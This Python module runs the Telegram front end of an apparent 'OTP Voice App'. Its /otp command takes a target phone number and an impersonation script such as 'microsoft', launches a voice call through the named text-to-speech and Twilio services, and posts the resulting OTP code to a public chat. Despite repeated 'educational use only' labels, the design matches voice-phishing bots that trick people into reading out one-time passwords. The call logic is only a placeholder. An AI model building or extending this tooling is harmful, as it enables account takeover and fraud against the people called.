"""
Telegram Bot Service
Handles Telegram bot integration for capturing inputs and sending OTP results
"""

import logging
import asyncio
from typing import Dict, Any, Optional
import telegram
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from config.settings import Config

logger = logging.getLogger(__name__)

class TelegramService:
    """Service for handling Telegram bot operations"""

    def __init__(self):
        """Initialize Telegram service"""
        self.bot_token = Config.TELEGRAM_BOT_TOKEN
        self.public_chat_id = Config.TELEGRAM_PUBLIC_CHAT

        if not self.bot_token:
            logger.warning("Telegram bot token not configured")
            self.bot = None
            self.application = None
        else:
            try:
                self.bot = Bot(token=self.bot_token)
                self.application = Application.builder().token(self.bot_token).build()
                self._setup_handlers()
                logger.info("Telegram service initialized successfully")
            except Exception as e:
                logger.error(f"Failed to initialize Telegram service: {e}")
                self.bot = None
                self.application = None

    def _setup_handlers(self):
        """Setup command and message handlers"""
        if not self.application:
            return

        # Command handlers
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("otp", self.otp_command))
        self.application.add_handler(CommandHandler("status", self.status_command))

        # Message handlers
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        welcome_message = """
🤖 Welcome to OTP Voice App Bot!

This bot helps manage voice-based OTP (One-Time Password) operations for educational purposes.

Available commands:
/help - Show this help message
/otp <phone_number> <script_name> - Initiate OTP call
/status - Check service status

Educational Use Only - This app simulates OTP systems for learning purposes.
        """
        await update.message.reply_text(welcome_message)

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /help command"""
        help_message = """
🔧 OTP Voice App Commands:

/start - Welcome message and introduction
/help - Show this help message
/otp <phone_number> <script_name> - Start OTP voice call
/status - Check service health status

📱 Usage Examples:
/otp +1234567890 microsoft
/otp +33123456789 "otp france"

⚠️ Educational Purpose Only
This bot is designed for educational and testing purposes.
Do not use for actual authentication systems.
        """
        await update.message.reply_text(help_message)

    async def otp_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /otp command"""
        try:
            if len(context.args) < 2:
                await update.message.reply_text(
                    "❌ Usage: /otp <phone_number> <script_name>\n"
                    "Example: /otp +1234567890 microsoft"
                )
                return

            phone_number = context.args[0]
            script_name = " ".join(context.args[1:])
            user_id = update.effective_user.id

            # Log the OTP request
            logger.info(f"OTP request from user {user_id}: {phone_number} with script '{script_name}'")

            # Send confirmation
            await update.message.reply_text(
                f"🔄 Processing OTP request...\n"
                f"📞 Phone: {phone_number}\n"
                f"📝 Script: {script_name}\n"
                f"👤 User ID: {user_id}"
            )

            # Here you would integrate with your OTP service
            # For now, we'll send a placeholder response
            otp_result = {
                'phone_number': phone_number,
                'script_name': script_name,
                'user_id': user_id,
                'status': 'initiated'
            }

            # Send result to public chat if configured
            if self.public_chat_id:
                await self.send_otp_result(otp_result)

        except Exception as e:
            logger.error(f"Error handling OTP command: {e}")
            await update.message.reply_text("❌ Error processing OTP request. Please try again.")

    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /status command"""
        status_message = """
📊 Service Status:

🤖 Telegram Bot: ✅ Online
🔊 ElevenLabs TTS: ⚠️ Check API key
📞 Twilio Voice: ⚠️ Check credentials
🌐 Web App: ✅ Running

⚙️ Configuration:
- Voice Scripts: Available
- Webhook: Configured
- Logging: Active

Educational Mode: ON
        """
        await update.message.reply_text(status_message)

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle general messages"""
        message_text = update.message.text.lower()

        if "help" in message_text:
            await self.help_command(update, context)
        elif "otp" in message_text:
            await update.message.reply_text(
                "📝 To start an OTP call, use:\n/otp <phone_number> <script_name>"
            )
        else:
            await update.message.reply_text(
                "👋 Hello! Use /help to see available commands."
            )

    async def send_message(self, chat_id: str, message: str) -> Dict[str, Any]:
        """
        Send a message to a specific chat

        Args:
            chat_id: Telegram chat ID
            message: Message to send

        Returns:
            Dict containing send status
        """
        if not self.bot:
            return {
                'success': False,
                'error': 'Telegram bot not initialized'
            }

        try:
            message_obj = await self.bot.send_message(chat_id=chat_id, text=message)
            logger.info(f"Message sent to chat {chat_id}: {message_obj.message_id}")

            return {
                'success': True,
                'message_id': message_obj.message_id,
                'chat_id': chat_id
            }

        except Exception as e:
            logger.error(f"Error sending message: {e}")
            return {
                'success': False,
                'error': str(e)
            }

    async def send_otp_result(self, otp_result: Dict[str, Any]) -> Dict[str, Any]:
        """
        Send OTP result to public chat

        Args:
            otp_result: OTP operation result data

        Returns:
            Dict containing send status
        """
        if not self.public_chat_id:
            return {
                'success': False,
                'error': 'Public chat not configured'
            }

        # Format result message
        status_emoji = "✅" if otp_result.get('success', False) else "❌"
        message = f"""
{status_emoji} OTP Operation Result

📞 Phone: {otp_result.get('phone_number', 'N/A')}
📝 Script: {otp_result.get('script_name', 'N/A')}
👤 User ID: {otp_result.get('user_id', 'N/A')}
🔢 OTP Code: {otp_result.get('otp_code', 'Generated')}
📊 Status: {otp_result.get('status', 'Unknown')}
🕐 Time: {otp_result.get('timestamp', 'N/A')}

🎓 Educational Use Only
        """

        return await self.send_message(self.public_chat_id, message)

    def start_bot(self):
        """Start the Telegram bot"""
        if not self.application:
            logger.error("Cannot start bot - not initialized")
            return

        try:
            logger.info("Starting Telegram bot...")
            self.application.run_polling()
        except Exception as e:
            logger.error(f"Error running bot: {e}")

    async def set_webhook(self, webhook_url: str) -> Dict[str, Any]:
        """
        Set webhook for the bot

        Args:
            webhook_url: URL for webhook

        Returns:
            Dict containing webhook setup status
        """
        if not self.bot:
            return {
                'success': False,
                'error': 'Telegram bot not initialized'
            }

        try:
            success = await self.bot.set_webhook(url=webhook_url)
            logger.info(f"Webhook set: {webhook_url}")

            return {
                'success': success,
                'webhook_url': webhook_url
            }

        except Exception as e:
            logger.error(f"Error setting webhook: {e}")
            return {
                'success': False,
                'error': str(e)
            }
